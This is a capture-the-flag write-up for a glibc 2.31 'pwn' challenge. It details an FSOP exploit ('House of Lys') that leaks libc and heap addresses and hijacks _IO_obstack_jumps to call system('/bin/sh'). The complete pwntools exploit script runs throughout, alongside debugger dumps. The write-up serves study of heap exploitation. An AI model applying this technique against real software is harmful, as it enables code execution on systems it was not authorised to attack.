---
title: "House of Lys — Circumventing 0xa0-Byte Memory Caps via Obstack Hijacking"
ctf: "ss 2022"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-05-18"
lat: -20.71
lng: 300
summary: "Faced with a strict 0xa0-byte payload restriction that eliminated wide-character FSOP chains, I shifted execution targets to _IO_obstack_jumps, triggering an unvalidated inner branch inside _obstack_newchunk to execute system()."
tags:
  - "heap"
  - "fsop"
  - "house-of-lys"
  - "_IO_obstack_jumps"
  - "memory-constraints"
  - "glibc-2.31"
---

```python
#!/usr/bin/env python3

from pwn import pause, u64, p64, ELF, context, args, process, log

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def trick(fp, pos=0):
    for i in range(len(fp)):
        r.sendlineafter(b"> ", b"2")
        if not pos:
            r.sendafter(b"offset: ", f"{i}".encode())
        else:
            r.sendafter(b"offset: ", f"{i + pos}".encode())
        r.sendafter(b"value: ", f"{fp[i]}".encode())


def main():
    global r
    r = conn()
```
   
    Ok, since we are now familiar with _IO_FILE_plus, we can move to the next idea.
    We have a challenge here that gives us a write primitive to a stream that is open, 
    but the implementation is a little weird:
    ---------------------------------------
    movzx edx, byte ptr [rbp-9]  -> offset
    mov   rax, qword ptr [rbp-8] -> stream
    add   rax, rdx               -> stream+offset
    mov   edx, ecx               -> value
    mov   byte ptr [rax], dl     -> *(stream+offset) = value
    ---------------------------------------

    So now we have a write primitive on the stream structure, changing one byte at a time 
    using option two. Let's implement a wrapper function where you just pass a byte array 
    and it automatically writes it to the target stream.
    
    The logic needs to loop from 0 to the length of the input, where the counter acts as both the 
    current index for the value being sent and the structure offset. I think this will work perfectly! :)
    Let's try it.
 
   ```python
    fp          = bytearray(0x10) 
    fp[0:0x8]   = p64(0x4141)     # _flags
    fp[0x8:0x10]= p64(0x4242)     # _IO_read_ptr

```
    And yes, the function is working perfectly! Look at this, yay:
    -----------------------------------------------
    pwndbg> p/a *(struct _IO_FILE_plus*)0x56471b9a92a0
    $2 = {
    file = {
    _flags = 0x4141,
    _IO_read_ptr = 0x4242,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fd1b8ae65c0 <_IO_2_1_stderr_>,
    _fileno = 0x3,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x56471b9a9380,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
    },
    vtable = 0x7fd1b8ae24a0 <__GI__IO_file_jumps>
    }
    --------------------------------------------------

    Now, what is the next step? We only have a write primitive, and we need to leak
    the libc address at the very least. Holy shit, how are we going to pull that off?

    I see that option two calls fflush(stream) on the stream we overwrite. This is an 
    interesting vector and might just be our trick for the leak, but how, how, how?
    Hmm... wait, what if I just change the stream's _flags for a write operation, like 
    setting it to 0xfbad1800? What happens then? We would also need to change _fileno 
    to 1 for stdout, right? Let's test that out, dude.
    
    Bro, it's not working. I mean, nothing is printing, so I think we need to play with 
    _IO_write_end and _IO_write_ptr instead.
    I looked closely at _IO_file_jumps and saw we can overwrite the lowest bytes there, 
    but what's the point of that? So I moved to the next step of thinking and checked 
    what happens when fflush is triggered on a stream. There are checks that look like this 
    before it handles the call:
    ------------------------------------
    mov rbp, qword ptr [rbx+0xd8]
    lea rdx,[rip + offset]
    sub rax,rdx
    mov rsi,rbp
    sub rsi,rdx
    cmp rax,rsi
    jbe abort

    call qword ptr [rbp+0x60]
    ------------------------------------

    So, as we can see, if we overwrite rbx+0xd8 with partial bytes to make the call point 
    to a useful function, it will work. But what magic function will actually help us 
    get a leak or at least populate our stream structure with valid addresses? Hmmm...

    When we need a valid heap pointer, what do we usually do? We invoke malloc(), and the 
    system returns a heap data chunk address. Does _IO_FILE_plus have anything similar to that 
    inside its operational _IO_file_jumps tables? I went searching for it.
    
    And yes! I found a function called _IO_file_underflow. If we call it while satisfying 
    _IO_read_ptr == _IO_read_end and _IO_buf_base == 0, it performs a refill routine, which 
    internally calls malloc to provision a new buffer! This function sits at offset 0x18 
    on _IO_file_jumps, but our current call structure targets _IO_file_jumps+0x60. Overwriting 
    the least significant bytes with 0x00 at most won't work, holy shit. We will hit a dead end, 
    or wait... let me try overwriting the least significant byte to line up with 0x60 so the 
    next indirect call hits our target function instead. Let's see:

    call   qword ptr [rbp + 0x60]   -> _IO_file_underflow

    And yeah, it's working! So what's the goal here? We need to see if we can fill the structure 
    with some valid addresses. By forcing _IO_file_underflow to call _IO_doallocbuf (the name 
    literally makes sense, "do allocate buffer" aka malloc, haha), the file stream structure 
    should change. 
    
    But wait, bro... inside _IO_doallocbuf, it tries to call an index from the vtable again! This 
    might break things since we changed the vtable pointer earlier. Look at this instruction:
    <_IO_doallocbuf+77>    call   qword ptr [rbp + 0x68]      <_IO_default_uflow>

    What if we just call _IO_doallocbuf directly without using _IO_file_underflow as the middleman? 
    Hmm, let's look into that.

    I redirected the execution to it directly and boom! Here, the offset invokes the exact function 
    we wanted: _IO_setB. This code is responsible for initializing and changing the base buffer pointers 
    after malloc finishes allocating space. I'm so happy! :D
    
    But shit, it only populates _IO_buf_base and _IO_buf_end. That's fine though, I have already 
    thought out the next step for this primitive:
    --------------------------------------------------~
    pwndbg> p *(struct _IO_FILE_plus*)0x557ea94d62a0
    $2 = {
    file = {
    _flags = -72548352,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x557ea94d6480 "",
    _IO_buf_end = 0x557ea94d8480 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x557ea94d6380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
    },
    vtable = 0x7f9bd74b54a8 <__GI__IO_file_jumps+8>
    }
    ----------------------------------------------------------~

    We need to set up the write fields (_IO_write_*). If we invoke _IO_file_overflow on this 
    modified structure, what do you think will happen? 
    It executes the following logic:
    -------------------------------------------------------~
    call _IO_doallocbuf |
                        V
                        cmp qword ptr [rdi + 0x38],0
                        je malloc
    ret

    mov rdx, qword ptr [rdi + 0x38]
    mov eax, dword ptr [rbp]

    mov qword ptr [rbp+0x18], rdx
    mov qword ptr [rbp+0x8] , rdx
    mov qword ptr [rbp+0x10], rdx
    .
    .
    .
    mov rax , [rdx+1]
    mov qword ptr [rbp+0x28], rax
    --------------------------------------------------------~

    And yeah, now it looks exactly like this:

    ────────────────────────
    pwndbg> p *(struct _IO_FILE_plus*)0x559e2a04a2a0
    $3 = {
    file = {
    _flags = -72546304,
    _IO_read_ptr = 0x559e2a04a480 "\270",
    _IO_read_end = 0x559e2a04a480 "\270",
    _IO_read_base = 0x559e2a04a480 "\270",
    _IO_write_base = 0x559e2a04a480 "\270",
    _IO_write_ptr = 0x559e2a04a481 "",
    _IO_write_end = 0x559e2a04c480 "",
    _IO_buf_base = 0x559e2a04a480 "\270",
    _IO_buf_end = 0x559e2a04c480 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x559e2a04a380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
    },
    vtable = 0x7fe12a3f5458 <_IO_file_jumps_mmap+120>
    }
    ────────────────────────
    
```python
    fp = bytearray(0x78)
    fp[0x0:0x8] = p64(0xFBAD0000) # _flags
    fp[0x20:0x28] = p64(0)        
    fp[0x28:0x30] = p64(0)
    fp[0x38:0x40] = p64(0)
    fp[0x40:0x48] = p64(0)
    fp[0x70:0x78] = p64(0x0)

    #pause()
    trick(fp)
    trick(b"\xa8", 0xD8)          # to call _IO_doallocbuf
    r.sendlineafter(b"> ", b"1")

    trick(b"\x58", 0xD8)          # to call _IO_file_overflow
    r.sendlineafter(b"> ", b"1")

```
    And yes, now we can leak some shit! ;D
    What function do we want to call now? _IO_file_xsputn.
    I tried it, but it fails while getting the length. Why? I think 
    there is a custom check we saw earlier when doing weird things with:

    ~> sub rsi, rdx

    So now RSI is just garbage data, and when strlen is called, it 
    still has this un-updated RSI value. Thus, it fails when trying:

    ~> rep movsb byte ptr [rdi], byte ptr [rsi]

    I tried to search for a check that we could satisfy before strlen 
    is called to change the RSI register, but there is no way. ;D

    So, what now? We need a function that, when called, simply prints anything out for us.
    Bro, why don't we just use fflush with the right file pointer (FP)? And yes, we saw before that 
    it calls _IO_file_sync. This function checks if _IO_write_ptr > _IO_write_base, and if true,
    it simply calls write()! That's literally it. Let's try it. Okay, I hate myself—why did it 
    take me a whole day to figure all of that out?

    Now, let's search through this memory dump for anything that can lead to a libc leak:

    pwndbg> x/100gx 0x55fa4595e400
    0x55fa4595e400: 0x0000000000000000  0x0000000000000000
    0x55fa4595e410: 0x0000000000000000  0x0000000000000000
    0x55fa4595e420: 0x0000000000000000  0x0000000000000000
    0x55fa4595e430: 0x0000000000000000  0x0000000000000000
    0x55fa4595e440: 0x0000000000000000  0x0000000000000000
    0x55fa4595e450: 0x0000000000000000  0x0000000000000000
    0x55fa4595e460: 0x0000000000000000  0x0000000000000000
    0x55fa4595e470: 0x00007f86918adf60  0x0000000000002011
    0x55fa4595e480: 0x00000000000000b8  0x0000000000000000
    0x55fa4595e490: 0x0000000000000000  0x0000000000000000
    0x55fa4595e4a0: 0x0000000000000000  0x0000000000000000
    0x55fa4595e4b0: 0x0000000000000000  0x0000000000000000
    0x55fa4595e4c0: 0x0000000000000000  0x0000000000000000
    0x55fa4595e4d0: 0x0000000000000000  0x0000000000000000

    I see this address: 0x00007f86918adf60. Interesting! We will leak 
    it and transition to our final stage. We just need to align our write limits:
    [_IO_write_base : _IO_write_ptr] -> [offset 0x70 : offset 0x78]
    

```python

    fp = bytearray(0x20)

    fp[0x0:0x8] = p64(0xFBAD1800)
    trick(fp)

    trick(b"\x70", 0x20) # _IO_write_base
    trick(b"\x78", 0x28) # _IO_write_ptr
    trick(p64(1) , 0x70) # _fileno

    trick(b"\xa0", 0xD8) # back to default _IO_file_jumps
    r.sendlineafter(b"> ", b"1")

    lib = u64(r.recv(0x8)) - libc.sym["_IO_wfile_jumps"]
    libc.address = lib
```
    Finally, now we have the leak! I'm tired, so tired. We need to perform
    a call to system(), which is exactly why we got the leak to build a custom 
    stream. But how? Hahahah, I'm dumb—I got the leak but I forgot how 
    to do that. Where is the heap base? We need it when we craft our fake 
    vtable. So let's get the heap address; it's so simple, I think.
    Now that we already have libc, is there any pointer in libc pointing to the heap?
    Yes, for sure! We can read from main_arena since the heap is already in use, 
    and we will extract the heap base straight from it.

    Easy peasy, just change _IO_write_ptr / _IO_write_base.
    
```python
    main_arena = libc.address + 0x1ED5A0  # this points to our stream
    
    trick(p64(main_arena)      , 0x20) # _IO_write_base
    trick(p64(main_arena + 0x8), 0x28) # _IO_write_ptr
    r.sendlineafter(b"> ", b"1")

    heap = u64(r.recv(0x8)) - 0x2A0
    log.success(f"LEAK:\nlibase:{hex(lib)}\nheapbase:{hex(heap)}\n")

```
     
    Wow, we got the heap! And now the final step is to build the stream
    with our libc and heap addresses to invoke our target function from wide_vtable,
    and have that call system(). Hmm, what? o_O
    I will try to trigger some function from _IO_wfile_jumps.
    
```python
    # fp = bytearray(0xE0)
    # fp[0x0:0x8] = p64(0x414141)
    # fp[0x20:0x28] = p64(0)
    # fp[0x28:0x30] = p64(0)
    # fp[0x38:0x40] = p64(0)
    # fp[0x40:0x48] = p64(0)
    # fp[0x70:0x78] = p64(0x0)
    # fp[0x88:0x90] = p64(0x424242)
    # fp[0xA0:0xA8] = p64(0x434343)
    # fp[0xD8:0xE0] = p64(0x444444)

    # trick(fp)
    # r.sendlineafter(b"> ", b"1")
```
      
    Bro, what in the world?! Why can't I overwrite anything past the 
    _wide_data pointer boundary? Whyyyyyyy? Shit!
    Is it because of the 0xa0 offset restriction or what? I'm really about to die.
    So this specific challenge can't be solved using the wide_vtable technique.
     What next? Is there any other jump table structure we can use?
    I don't know, I spent all my energy just trying to get that leak. I'm dumb.
    I was thinking that if I got the leak, I could just jump directly to _IO_wfile_jumps
    and easily get a shell... O_O 
    
    I will search around or ask Gemini. If I can't overwrite wide_vtable, I need another 
    internal jump table instead of wfile. I'm not going to guess blindly anymore; I need 
    to see a clear path ahead, haha.
    
    The debugger shows me: yes, there is _IO_str_jumps and _IO_obstack_jumps! 
    I don't know exactly how obstack works yet, so I will exploit the first one: _IO_str_jumps.
    Let's cook!
    
```python
    # trick(p64(libc.sym["_IO_str_jumps"] - 0x60 + 0x18), 0xD8)
    # r.sendlineafter(b"> ", b"1")
```
    Bro, I will not trust Gemini at first—there was no direct call we could hijack there.
    Lmao dumb Gemini, I asked it and it told me that since I'm targeting a modern libc, 
    that traditional vector was removed anyway. Let's move on to the next one:
    _IO_obstack_jumps. What does it mean? No idea, so let's see.
    Okay, let's move to the next method, which relies on _IO_obstack_overflow:
    --------------------------------------------------------
    mov rbx, qword ptr [rdi+0xe0]
    mov rax, qword ptr [rbx+0x18]
    lea rdx, [rax+1]
    cmp rdx, qword ptr [rbx+0x20]
    ja call obstack_newchunk |
                             V
                             movsxd rdx, dword ptr [rdi+0x30]
                             lea    rbp, [rax+rdx+0x64]
                             mov    rax, qword ptr [rdi+0x38]
                             cmp    qword ptr [rdi], rbp
                             cmovge rbp, qword ptr [rdi]
                             test   byte ptr [rdi + 0x50], 1
                             je |
                                V
                                mov rdi, rbp
                                call rax
    ---------------------------------------------------------

    So this is exactly what we wanted to construct, and I tried it and it's working!
    And we got a shell! Yes, thank God!

    ---------------------------------------------------------
    [ #2] 0x78e7e98585bb <do_system+0x2eb>
    [ #3] 0x7f7dcff5a7c3 _obstack_newchunk+451
    [ #4] 0x7f7dcff4812d _IO_obstack_overflow+109
    [ #5] 0x7f7dcff3e3c6 fflush+134
    [ #6] 0x5569be2722ca main+161
    [ #7] 0x7f7dcfee0083 __libc_start_main+243
    [ #8] 0x5569be27216e _start+46
    ----------------------------------------------------------
    And big thanks to Gemini after all—it did point out that I could use an overflow from 
    str_jumps or obstack_jumps, so that helped me a lot. Granted, if I had put more effort 
    into it, I would have eventually found it by myself, but I framed the question like: 
    'I can't write past offset 0xa0 on my stream structure, so is there another function 
    not from _IO_wfile_jumps that I can use to redirect the execution flow?' 
    And yeah, there it was!
    
    So with a little bit of searching, I found the official name for this exploit style:
    House of Lys! ;D
    Lol, I was able to figure out two whole advanced exploit families—House of Cat and this one—
    in record time. I'm starting to love this game, but it's pure panic and exhaustion. I'm going 
    to pass out soon. I seriously need to go outside and touch some grass just one time. Bye!
    
```python
    obstack = heap + 0x320 - 0x100000080

    trick(p64(next(libc.search(b"/bin/sh"))))
    trick(p64(libc.sym["system"]), 0x38)
    trick(p64(libc.sym["_IO_obstack_jumps"] - 0x60 + 0x18), 0xD8) 
    trick(p64(obstack), 0xE0)

    r.sendlineafter(b"> ", b"1")
    r.interactive()


if __name__ == "__main__":
    main()
```